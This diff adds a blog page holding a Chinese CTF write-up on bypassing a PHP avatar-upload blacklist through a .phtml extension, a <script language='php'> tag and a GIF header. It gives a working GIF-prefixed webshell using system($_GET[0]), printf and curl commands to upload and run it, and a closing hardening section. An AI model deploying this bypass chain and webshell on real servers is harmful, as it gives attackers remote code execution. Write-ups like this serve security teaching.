@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web安全 · 文件上传绕过（黑名单反转 + `&lt;script&gt;` 标签）WriteUp —「上传头像」 · pressure-J</title>
+<meta name="description" content="首页是一个&quot;上传头像&quot;页面，表单指向 uploadfile.php：">
+<meta name="author" content="pressure-J">
+<meta name="color-scheme" content="dark light">
+<link rel="canonical" href="https://pressure-j.github.io/posts/web-an-quan-wen-jian-shang-chuan-rao-guo-hei-ming-dan-fan-zhuan-scri.html">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Web安全 · 文件上传绕过（黑名单反转 + `&lt;script&gt;` 标签）WriteUp —「上传头像」 · pressure-J">
+<meta property="og:description" content="首页是一个&quot;上传头像&quot;页面，表单指向 uploadfile.php：">
+<meta property="og:site_name" content="pressure-J">
+<meta name="twitter:card" content="summary">
+<link rel="alternate" type="application/rss+xml" title="pressure-J" href="../rss.xml">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡</text></svg>">
+<link rel="stylesheet" href="../assets/style.css">
+<link rel="stylesheet" href="../assets/highlight.css">
+<script>
+(function() {
+  try {
+    var t = localStorage.getItem('theme');
+    if (!t) t = window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark';
+    document.documentElement.setAttribute('data-theme', t);
+  } catch (e) {}
+})();
+</script>
+</head>
+<body class="has-toc">
+<div class="progress-bar" id="progress"></div>
+<header class="site-header">
+  <div class="wrap header-inner">
+    <a class="brand" href="../index.html">
+      <span class="brand-mark">$</span><span class="brand-name">pressure-J</span><span class="brand-caret">_</span>
+    </a>
+    <nav class="site-nav" id="site-nav"><a href="../index.html">首页</a><a href="../posts.html" class="on">文章</a><a href="../category/index.html">分类</a><a href="../about.html">关于</a></nav>
+    <div class="header-tools">
+      <a class="icon-btn" href="../posts.html#search" aria-label="搜索">
+        <svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+      </a>
+      <button class="icon-btn" id="theme-toggle" type="button" aria-label="切换主题">
+        <svg class="i-sun" viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="4.4"/><path d="M12 2.2v2.2M12 19.6v2.2M2.2 12h2.2M19.6 12h2.2M4.9 4.9l1.6 1.6M17.5 17.5l1.6 1.6M19.1 4.9l-1.6 1.6M6.5 17.5l-1.6 1.6"/></svg>
+        <svg class="i-moon" viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round"><path d="M21 12.9A8.6 8.6 0 1 1 11.1 3a6.6 6.6 0 0 0 9.9 9.9z"/></svg>
+      </button>
+      <button class="icon-btn menu-btn" id="menu-btn" type="button" aria-label="菜单" aria-expanded="false">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M3 6h18M3 12h18M3 18h18"/></svg>
+      </button>
+    </div>
+  </div>
+</header>
+<main class="wrap post-layout">
+  <div class="post-main">
+    <nav class="breadcrumb">
+      <a href="../index.html">首页</a><span>/</span>
+      <a href="../category/web.html">Web 安全</a>
+    </nav>
+    <article class="post">
+      <header class="post-header">
+        <h1>Web安全 · 文件上传绕过（黑名单反转 + `&lt;script&gt;` 标签）WriteUp —「上传头像」</h1>
+        <div class="post-meta">
+          <span class="cat-badge cat-web">Web 安全</span>
+          <time datetime="2026-10-05">2026-10-05</time>
+          <span>6746 字</span>
+          <span>约 18 分钟</span>
+        </div>
+        
+      </header>
+      <div class="content"><blockquote>
+<p>目标：<code>http://377ddd48e04583d0a32a5e08.http-ctf2.dasctf.com/</code><br />
+环境：PHP 5.5.9（Ubuntu），Apache 风格目录列表<br />
+考点：文件上传黑名单绕过 × 3 层（扩展名 / 内容 / 图片头）<br />
+flag：<code>CTF2{839c35af-b48a-4f13-b966-bcf47453168d}</code></p>
+</blockquote>
+<hr />
+<h2 id="_1">一、信息收集</h2>
+<p>首页是一个"上传头像"页面，表单指向 <code>upload_file.php</code>：</p>
+<div class="code-block" data-lang="html"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">"upload_file.php"</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"multipart/form-data"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">input</span> <span class="err">...</span> <span class="na">name</span><span class="o">=</span><span class="s">"file"</span><span class="p">&gt;</span>  <span class="cm">&lt;!-- 上传图片 --&gt;</span>
+</code></pre></div></div>
+
+<p>先做基础探测：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>/upload/          → 200，★ 目录列表开启（Apache autoindex）★
+/upload_file.phps → 403（存在但被拒）
+/flag /flag.php   → 404（不在 web 目录，直接访问不到）
+</code></pre></div></div>
+
+<p><strong><code>/upload/</code> 目录列表开启是本题最大的福利</strong>——所有上传的文件名都能直接看到，包括：<br />
+- 之前试上传留下的文件名（帮助判断随机化规则）<br />
+- 一些<strong>出题人留的 decoy 文件</strong>（下面会讲）</p>
+<hr />
+<h2 id="phtml-webshell">二、源码（通过上传 <code>.phtml</code> webshell 后读到）</h2>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">];</span>
+
+<span class="c1">// 允许上传的图片后缀</span>
+<span class="nv">$allowedExts</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">"php"</span><span class="p">,</span><span class="s2">"php2"</span><span class="p">,</span><span class="s2">"php3"</span><span class="p">,</span><span class="s2">"php4"</span><span class="p">,</span><span class="s2">"php5"</span><span class="p">,</span><span class="s2">"pht"</span><span class="p">,</span><span class="s2">"phtm"</span><span class="p">);</span>
+<span class="nv">$temp</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"."</span><span class="p">,</span> <span class="nv">$file</span><span class="p">[</span><span class="s2">"name"</span><span class="p">]);</span>
+<span class="nv">$extension</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nb">end</span><span class="p">(</span><span class="nv">$temp</span><span class="p">));</span>        <span class="c1">// 获取文件后缀名</span>
+<span class="nv">$image_type</span> <span class="o">=</span> <span class="o">@</span><span class="nb">exif_imagetype</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s2">"tmp_name"</span><span class="p">]);</span>
+<span class="k">if</span> <span class="p">(((</span><span class="nv">$file</span><span class="p">[</span><span class="s2">"type"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"image/gif"</span><span class="p">)</span>
+  <span class="o">||</span> <span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s2">"type"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"image/jpeg"</span><span class="p">)</span>
+  <span class="o">||</span> <span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s2">"type"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"image/jpg"</span><span class="p">)</span>
+  <span class="o">||</span> <span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s2">"type"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"image/pjpeg"</span><span class="p">)</span>
+  <span class="o">||</span> <span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s2">"type"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"image/x-png"</span><span class="p">)</span>
+  <span class="o">||</span> <span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s2">"type"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"image/png"</span><span class="p">))</span>
+  <span class="o">&amp;&amp;</span> <span class="nv">$file</span><span class="p">[</span><span class="s2">"size"</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">20480</span><span class="p">)</span>                  <span class="c1">// 小于 20 KB</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s2">"error"</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">"ERROR!!!"</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">elseif</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$extension</span><span class="p">,</span> <span class="nv">$allowedExts</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">"NOT！"</span><span class="o">.</span><span class="nv">$extension</span><span class="o">.</span><span class="s2">"!"</span><span class="p">;</span>          <span class="c1">// ← 在黑名单里 → 拒绝</span>
+    <span class="p">}</span>
+    <span class="k">elseif</span> <span class="p">(</span><span class="nb">mb_strpos</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s2">"tmp_name"</span><span class="p">]),</span> <span class="s2">"&lt;?"</span><span class="p">)</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">"NO! HACKER! your file included '&lt;?'"</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="nv">$image_type</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">"Don't lie to me, it's not image at all!!!"</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="nv">$fileName</span> <span class="o">=</span> <span class="s1">'./upload/'</span><span class="o">.</span><span class="nv">$file</span><span class="p">[</span><span class="s1">'name'</span><span class="p">];</span>
+        <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s2">"tmp_name"</span><span class="p">],</span> <span class="nv">$fileName</span><span class="p">);</span>
+        <span class="k">echo</span> <span class="s2">"上传文件名: "</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="s2">"name"</span><span class="p">]</span> <span class="o">.</span> <span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">else</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"Not image!"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<h3 id="allowedexts">⚠️ 第一个坑：<code>$allowedExts</code> 名字是骗人的</h3>
+<p>变量名叫 <strong><code>allowedExts</code>（允许的扩展名）</strong>，但代码逻辑是：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="x">elseif (in_array($extension, $allowedExts)) {</span>
+<span class="x">    echo "NOT！".$extension."!";    // ← 命中了反而被拒！</span>
+<span class="x">}</span>
+</code></pre></div></div>
+
+<p><strong>这是个黑名单，不是白名单。</strong> 名字起反了（出题人故意为之，或者原作者的迷惑命名）。数组里列的是<strong>被禁止</strong>的扩展名：</p>
+<div class="code-block" data-lang="php"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>禁止: php, php2, php3, php4, php5, pht, phtm
+</code></pre></div></div>
+
+<p><strong>漏掉的</strong>（可用的绕过点）：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>.phtml   ← ★ 关键（Apache 默认 FilesMatch ".+\.ph(ar|p|tml)$" 会执行它）
+.phar .php6 .php7 .php8 .phpx .xphp .ph .php.
+</code></pre></div></div>
+
+<h3 id="_2">三道检查的执行顺序</h3>
+<div class="code-block" data-lang="php"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>1. $_FILES["type"] 是否在图片 MIME 白名单 且 size &lt; 20KB   （外层 if）
+   └─ 不满足 → "Not image!"
+2. 扩展名是否在黑名单                              → "NOT！xxx!"
+3. 文件内容是否含 "&lt;?"
+4. exif_imagetype() 是否识别为图片                 → "Don't lie to me..."
+   └─ 全过 → 保存
+</code></pre></div></div>
+
+<p><strong>注意第 1 步 <code>$file["type"]</code> 是客户端传的 <code>Content-Type</code>，可任意伪造</strong>；<br />
+<strong>第 3、4 步必须同时满足</strong>——文件要"既是图片、又不能含 <code>&lt;?</code>"。</p>
+<hr />
+<h2 id="_3">三、逐层绕过</h2>
+<h3 id="1-phtml">第 1 层：扩展名黑名单 —— 用 <code>.phtml</code></h3>
+<p>黑名单只列了 <code>php/php2-5/pht/phtm</code>，<strong>没有 <code>phtml</code></strong>。<br />
+而 Apache 的 <code>mod_php</code> 默认配置是：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="nt">&lt;FilesMatch</span><span class="w"> </span><span class="s">".+\.ph(ar|p|tml)$"</span><span class="nt">&gt;</span>
+<span class="w">    </span><span class="nb">SetHandler</span><span class="w"> </span>application/x-httpd-php
+<span class="nt">&lt;/FilesMatch&gt;</span>
+</code></pre></div></div>
+
+<p><strong><code>.phtml</code> 会被当成 PHP 执行</strong>。实测扩展名扫描结果：</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>扩展名</th>
+<th>上传</th>
+<th>执行</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>.php</code> <code>.php2-5</code> <code>.pht</code> <code>.phtm</code></td>
+<td>❌ 黑名单</td>
+<td>—</td>
+</tr>
+<tr>
+<td><strong><code>.phtml</code></strong></td>
+<td>✅</td>
+<td><strong>✅ 执行！</strong></td>
+</tr>
+<tr>
+<td><code>.phar</code></td>
+<td>✅</td>
+<td>❌ 不执行</td>
+</tr>
+<tr>
+<td><code>.php6</code> <code>.php7</code> <code>.php8</code> <code>.phpx</code> <code>.xphp</code> <code>.ph</code></td>
+<td>✅</td>
+<td>❌ 不执行</td>
+</tr>
+<tr>
+<td><code>.phps</code></td>
+<td>✅</td>
+<td>403（Apache 拒绝直接服务）</td>
+</tr>
+</tbody>
+</table></div>
+<blockquote>
+<p>目录里出题人留的 decoy <code>shell.phtml</code>、<code>webshell.phtml</code> 正是在提示这一点。</p>
+</blockquote>
+<h3 id="2-script-languagephp">第 2 层：内容含 <code>&lt;?</code> —— 用 <code>&lt;script language="php"&gt;</code></h3>
+<p>代码检查 <code>mb_strpos(内容, "&lt;?")</code>，所以 <code>&lt;?php</code> 和 <code>&lt;?</code> 都被拦。但 <strong>PHP 5.x 支持另一种开标签</strong>：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="x">&lt;script language="php"&gt;</span>
+<span class="x">    代码写在这里</span>
+<span class="x">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>这个标签<strong>不含 <code>&lt;?</code></strong>，完美绕过内容检查。<strong>含 <code>&lt;?php</code> 被拦：</strong></p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>含 &lt;?php  -&gt; NO! HACKER! your file included '&lt;'
+含 &lt;?     -&gt; NO! HACKER! your file included '&lt;'
+</code></pre></div></div>
+
+<blockquote>
+<p>PHP 7 已移除 <code>&lt;script language="php"&gt;</code> 标签，但本题是 <strong>PHP 5.5.9</strong>，所以能用。<br />
+目录里的 <code>.s</code> 文件内容 <code>&lt;script langule=php&gt;phpinfo();&lt;/script&gt;</code>（<code>langule</code> 是故意写错的钓鱼）也是这个技巧的提示。</p>
+</blockquote>
+<h3 id="3-gif">第 3 层：图片头 —— 前置合法 GIF</h3>
+<p><code>exif_imagetype()</code> 只看<strong>文件开头的魔数</strong>（GIF 是 <code>GIF89a</code>）。在 payload 前面拼一个最小合法 GIF 即可：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="n">GIF</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'GIF89a</span><span class="se">\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff</span><span class="s1">!</span><span class="se">\xf9\x04\x01\x00\x00\x00\x00</span><span class="s1">,</span><span class="se">\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02</span><span class="s1">D</span><span class="se">\x01\x00</span><span class="s1">;'</span>
+<span class="n">PAYLOAD</span> <span class="o">=</span> <span class="n">GIF</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">'&lt;script language="php"&gt; @system($_GET[0]); &lt;/script&gt;'</span>
+</code></pre></div></div>
+
+<p><code>getimagesize</code>/<code>exif_imagetype</code> 只验证头部，后面跟什么它不管——这就是<strong>图片马</strong>的原理。</p>
+<hr />
+<h2 id="payload">四、最终 Payload</h2>
+<p>构造一个文件（GIF 头 + script 标签代码），命名为 <code>.phtml</code>：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>文件内容:
+GIF89a...(合法1x1 GIF 二进制)...&lt;script language="php"&gt; @system($_GET[0]); &lt;/script&gt;
+
+文件名: cl4y_xxxxxx.phtml
+Content-Type: image/gif          ← 伪造，满足外层 MIME 白名单
+</code></pre></div></div>
+
+<p><strong>手工操作（浏览器 + Burp）：</strong><br />
+1. 本地造好这个文件（改后缀为 <code>.phtml</code>）<br />
+2. 上传页面选文件 → <strong>Burp 拦包</strong> → 把 <code>filename</code> 改成 <code>x.phtml</code>、<code>Content-Type</code> 改成 <code>image/gif</code><br />
+3. 放行 → 回显 <code>上传文件名: x.phtml</code><br />
+4. 访问 <code>http://.../upload/x.phtml?0=id</code> → 执行</p>
+<p><strong>命令行一键复现：</strong></p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="c1"># 造文件</span>
+<span class="nb">printf</span><span class="w"> </span><span class="s1">'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;&lt;script language="php"&gt; @system($_GET[0]); &lt;/script&gt;'</span><span class="w"> </span>&gt;<span class="w"> </span>shell.phtml
+
+<span class="c1"># 上传</span>
+curl<span class="w"> </span>-F<span class="w"> </span><span class="s1">'file=@shell.phtml;filename=shell.phtml;type=image/gif'</span><span class="w"> </span><span class="se">\</span>
+<span class="w">     </span>http://377ddd48e04583d0a32a5e08.http-ctf2.dasctf.com/upload_file.php
+
+<span class="c1"># 执行</span>
+curl<span class="w"> </span><span class="s1">'http://377ddd48e04583d0a32a5e08.http-ctf2.dasctf.com/upload/shell.phtml?0=id'</span>
+→<span class="w"> </span><span class="nv">uid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span><span class="w"> </span>...
+
+curl<span class="w"> </span><span class="s1">'.../upload/shell.phtml?0=cat%20/flag'</span>
+→<span class="w"> </span>CTF2<span class="o">{</span>839c35af-b48a-4f13-b966-bcf47453168d<span class="o">}</span>
+</code></pre></div></div>
+
+<p><strong>flag = <code>CTF2{839c35af-b48a-4f13-b966-bcf47453168d}</code></strong>（位于 <code>/flag</code>，<code>www-data</code> 可读）</p>
+<hr />
+<h2 id="_4">五、顺带排除的思路（都试过，不行）</h2>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>思路</th>
+<th>结果</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>.htaccess</code> 加 <code>AddType ... .gif</code></td>
+<td>能上传但不生效</td>
+<td>后端虽有 Apache 特征，但 <code>AllowOverride</code> 未开放；且上传的 <code>.htaccess</code> 文件名被改成带 <code>.htaccess</code> 结尾</td>
+</tr>
+<tr>
+<td><code>.user.ini</code> + <code>auto_prepend_file</code></td>
+<td>能上传，未验证生效</td>
+<td>nginx+PHP-FPM 下才有用；此处是 Apache mod_php</td>
+</tr>
+<tr>
+<td>nginx PATH_INFO (<code>/upload/x.gif/x.php</code>)</td>
+<td>404</td>
+<td>非 nginx 解析模式</td>
+</tr>
+<tr>
+<td><code>%00</code> 截断</td>
+<td>400 Bad Request</td>
+<td>PHP 5.3.4+ 已修复</td>
+</tr>
+<tr>
+<td><code>.phar</code> / <code>.php7</code> 等</td>
+<td>上传成功但不执行</td>
+<td>Apache FilesMatch 只认 <code>ph(ar\|p\|tml)</code>，但此容器配置下仅 <code>.phtml</code> 生效</td>
+</tr>
+</tbody>
+</table></div>
+<blockquote>
+<p>目录里那些 <code>..htaccess</code>、<code>.zzz</code>（含 <code>AddType application/x-httpd-php .zzz</code>、<code>php_value zend.multibyte 1</code>）都是<strong>出题人放的诱饵</strong>，指向"用 .htaccess 改解析"这条死路。真正的解是 <code>.phtml</code> + <code>&lt;script&gt;</code> 标签。</p>
+</blockquote>
+<hr />
+<h2 id="_5">六、知识点沉淀</h2>
+<h3 id="1">1. 变量名 ≠ 真实逻辑（读源码第一原则）</h3>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="x">$allowedExts = array("php","php2",...);   // 名字叫"允许"，实际是黑名单</span>
+<span class="x">elseif (in_array($extension, $allowedExts)) { echo "NOT！"; }  // 命中即拒绝</span>
+</code></pre></div></div>
+
+<p><strong>审源码永远看代码逻辑，不要相信变量名/注释。</strong> 黑名单和白名单的判定方向差一个 <code>!</code>，是安全审计最常见的低级错误。</p>
+<h3 id="2">2. 黑名单的天然缺陷：枚举不全</h3>
+<p>本题禁了 <code>php/php2-5/pht/phtm</code>，<strong>唯独漏了 <code>phtml</code></strong>。而 Apache 默认会把 <code>.phtml</code> 当 PHP 执行。<br />
+<strong>思路</strong>：拿到黑名单后，第一件事是列出"<strong>同类但未被列举</strong>"的等价项——<code>php</code> 系有 <code>phtml/php6/php7/php8/phar/phps/phpx/xphp</code>，一个个试。</p>
+<h3 id="3-script-languagephp">3. <code>&lt;?</code> 关键词检测 → <code>&lt;script language="php"&gt;</code></h3>
+<p>PHP 5.x 支持三种开标签：</p>
+<div class="code-block" data-lang="apache"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="cp">?&gt;</span><span class="x">                    // 标准</span>
+<span class="cp">&lt;?</span> <span class="cp">?&gt;</span><span class="x">                       // 短标签（需 short_open_tag=On）</span>
+<span class="x">&lt;script language="php"&gt; &lt;/script&gt;   // ★ 最冷门，绕过 "</span><span class="cp">&lt;?</span><span class="s2">"</span>
+</code></pre></div></div>
+
+<blockquote>
+<p><strong>PHP 7 已移除 <code>&lt;script language="php"&gt;</code></strong>，所以这个技巧只在 PHP 5 环境有效。看到 <code>PHP/5.x</code> 就该想到它。</p>
+</blockquote>
+<h3 id="4-exif_imagetype">4. 图片马（<code>exif_imagetype</code> 只验头）</h3>
+<p><code>exif_imagetype()</code> / <code>getimagesize()</code> 只读文件头几个字节判断类型，<strong>不检查后续内容</strong>。所以"合法图片头 + 任意代码"就能同时骗过"类型检查"和"内容检查"。这是上传题最通用的手法。</p>
+<h3 id="5-_filestype">5. <code>$_FILES["type"]</code> 完全不可信</h3>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="x">if ($file["type"] == "image/gif")   // ← 这是浏览器/攻击者传的 Content-Type</span>
+</code></pre></div></div>
+
+<p>它来自 HTTP 请求的 <code>Content-Type</code>，抓包随便改。<strong>服务端校验绝不能依赖它</strong>，必须自己读文件内容判断（<code>exif_imagetype</code>/<code>finfo</code>）。</p>
+<h3 id="6">6. 防御视角</h3>
+<div class="code-block" data-lang="php"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="x">// 正确做法</span>
+<span class="x">$allow = ['jpg','jpeg','png','gif'];                       // 真·白名单</span>
+<span class="x">$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));</span>
+<span class="x">if (!in_array($ext, $allow, true)) die('bad ext');</span>
+<span class="x">$mime = (new finfo(FILEINFO_MIME_TYPE))-&gt;file($_FILES['file']['tmp_name']);  // 服务端自检</span>
+<span class="x">if (!in_array($mime, ['image/jpeg','image/png','image/gif'], true)) die('bad mime');</span>
+<span class="x">$name = bin2hex(random_bytes(8)) . '.' . $ext;             // 随机重命名，丢弃原名</span>
+<span class="x">move_uploaded_file($_FILES['file']['tmp_name'], __DIR__.'/upload/'.$name);</span>
+<span class="x">// 并且：  </span>
+<span class="x">//   1) 用 allow_url_include=Off、disable_functions 限制</span>
+<span class="x">//   2) nginx/Apache 在 upload 目录禁止 PHP 执行（location ^~ /upload/ { ... }）</span>
+<span class="x">//   3) upload 目录不能有目录列表（autoindex off / Options -Indexes）</span>
+<span class="x">//   4) 敏感文件（flag）不要放可被 web 进程读到的路径</span>
+</code></pre></div></div>
+
+<p><strong>本题四宗罪</strong>：黑名单而非白名单、内容检测只用 <code>&lt;?</code> 关键词、依赖客户端 MIME、上传目录可执行 PHP + 目录列表开启。</p>
+<h3 id="7">7. 目录列表是重要的信息源</h3>
+<p><code>/upload/</code> 开启 autoindex 后，能直接看到：<br />
+- 出题人留下的 decoy 文件名（<code>shell.phtml</code>、<code>webshell.phtml</code>、<code>.zzz</code>）→ <strong>提示正确解法</strong><br />
+- 自己上传的文件是否真的落地、落地后的真实名字</p>
+<p><strong>实战习惯</strong>：发现目录列表就把它当"半个源码泄露"来用。</p></div>
+      <div class="post-nav"><a class="pn-item prev" href="web-an-quan-ping-ming-ling-zhu-ru-guo-lv-rao-guo-writeup-dasctf-huan.html"><span>← 上一篇</span><strong>Web安全 · Ping 命令注入过滤绕过 WriteUp（DASCTF 环境）</strong></a><a class="pn-item next" href="web-ji-chu-shu-zi-de-bu-tong-xie-fa-tong-pei-fu-zheng-ze-biao-da-shi.html"><span>下一篇 →</span><strong>Web基础 · 数字的不同写法 / 通配符 / 正则表达式</strong></a></div>
+      <div class="post-end">
+        <a href="../posts.html">← 返回文章列表</a>
+        <a href="https://github.com/pressure-J" target="_blank" rel="noopener">在 GitHub 上找我</a>
+      </div>
+    </article>
+  </div>
+  <aside class="toc" id="toc">
+  <div class="toc-title">目录</div>
+  <nav><a href="#_1" class="toc-lv2">一、信息收集</a><a href="#phtml-webshell" class="toc-lv2">二、源码（通过上传 .phtml webshell 后读到）</a><a href="#allowedexts" class="toc-lv3">⚠️ 第一个坑：$allowedExts 名字是骗人的</a><a href="#_2" class="toc-lv3">三道检查的执行顺序</a><a href="#_3" class="toc-lv2">三、逐层绕过</a><a href="#1-phtml" class="toc-lv3">第 1 层：扩展名黑名单 —— 用 .phtml</a><a href="#2-script-languagephp" class="toc-lv3">第 2 层：内容含 &amp;lt;? —— 用 &amp;lt;script language=&quot;php&quot;&amp;gt;</a><a href="#3-gif" class="toc-lv3">第 3 层：图片头 —— 前置合法 GIF</a><a href="#payload" class="toc-lv2">四、最终 Payload</a><a href="#_4" class="toc-lv2">五、顺带排除的思路（都试过，不行）</a><a href="#_5" class="toc-lv2">六、知识点沉淀</a><a href="#1" class="toc-lv3">1. 变量名 ≠ 真实逻辑（读源码第一原则）</a><a href="#2" class="toc-lv3">2. 黑名单的天然缺陷：枚举不全</a><a href="#3-script-languagephp" class="toc-lv3">3. &amp;lt;? 关键词检测 → &amp;lt;script language=&quot;php&quot;&amp;gt;</a><a href="#4-exif_imagetype" class="toc-lv3">4. 图片马（exif_imagetype 只验头）</a><a href="#5-_filestype" class="toc-lv3">5. $_FILES[&quot;type&quot;] 完全不可信</a><a href="#6" class="toc-lv3">6. 防御视角</a><a href="#7" class="toc-lv3">7. 目录列表是重要的信息源</a></nav>
+</aside>
+</main>
+<footer class="site-footer">
+  <div class="wrap footer-inner">
+    <div class="footer-col footer-about">
+      <div class="footer-brand">pressure-J<span class="brand-caret">_</span></div>
+      <p>网络安全 · 应急响应 · 流量分析<br>写能复现、能讲清楚的东西。</p>
+    </div>
+    <div class="footer-col">
+      <div class="footer-title">导航</div>
+      <a href="../index.html">首页</a>
+      <a href="../posts.html">全部文章</a>
+      <a href="../category/index.html">分类</a>
+      <a href="../about.html">关于</a>
+    </div>
+    <div class="footer-col">
+      <div class="footer-title">在别处</div>
+      <a href="https://github.com/pressure-J" target="_blank" rel="noopener">GitHub</a>
+      <a href="mailto:1489955298@qq.com">Email</a>
+      <a href="../rss.xml">RSS</a>
+    </div>
+  </div>
+  <div class="wrap footer-bottom">
+    <span>© 2026 pressure-J</span>
+    <span class="footer-build">Build 2026-10-19 · Python + Markdown</span>
+  </div>
+</footer>
+<button class="to-top" id="to-top" type="button" aria-label="回到顶部">
+  <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 19V5M5 12l7-7 7 7"/></svg>
+</button>
+<script src="../assets/app.js" defer></script>
+</body>
+</html>
